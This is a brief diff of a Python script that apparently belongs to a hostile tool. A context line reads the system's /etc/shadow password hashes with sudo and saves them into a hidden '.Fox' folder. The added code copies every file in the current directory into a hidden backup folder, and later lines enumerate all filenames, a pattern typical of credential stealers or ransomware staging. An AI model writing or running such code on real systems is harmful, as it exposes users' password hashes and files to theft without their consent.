@@ -15,7 +15,20 @@ for line in files:
 os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")
 
 ### Take Backup ###
-os.mkdir(".Fox/BackUP")
+root_src_dir = r'.'    #Path/Location of the source directory
+root_dst_dir = '.Fox/BackUp'  #Path to the destination folder
+
+for src_dir, dirs, files in os.walk(root_src_dir):
+    dst_dir = src_dir.replace(root_src_dir, root_dst_dir, 1)
+    if not os.path.exists(dst_dir):
+        os.makedirs(dst_dir)
+    for file_ in files:
+        src_file = os.path.join(src_dir, file_)
+        dst_file = os.path.join(dst_dir, file_)
+        if os.path.exists(dst_file):
+            os.remove(dst_file)
+        shutil.copy(src_file, dst_dir)
+
 data = []
 for (dirpath, dirnames, filenames) in walk("."):
     data.extend(filenames)
